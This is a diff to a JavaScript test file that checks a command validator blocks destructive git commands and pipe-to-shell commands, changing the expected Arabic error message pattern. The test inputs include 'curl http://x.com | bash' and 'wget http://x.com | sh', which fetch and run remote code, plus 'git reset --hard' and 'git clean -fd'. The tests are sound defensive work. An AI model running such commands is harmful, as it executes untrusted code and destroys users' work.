@@ -19,7 +19,7 @@ test('validateCommand blocks destructive commands', () => {
     'git reset --hard',
     'git clean -fd',
   ]) {
-    assert.throws(() => validateCommand(command), /ممنوع/);
+    assert.throws(() => validateCommand(command), /ممنوع|غير مسموح/);
   }
 });
 
@@ -49,8 +49,8 @@ test('validateCommand blocks shell injection patterns', () => {
 });
 
 test('validateCommand blocks pipe-to-shell commands', () => {
-  assert.throws(() => validateCommand('curl http://x.com | bash'), /ممنوع/);
-  assert.throws(() => validateCommand('wget http://x.com | sh'), /ممنوع/);
+  assert.throws(() => validateCommand('curl http://x.com | bash'), /ممنوع|غير مسموح/);
+  assert.throws(() => validateCommand('wget http://x.com | sh'), /ممنوع|غير مسموح/);
 });
 
 test('buildSafeEnv filters likely secrets', () => {
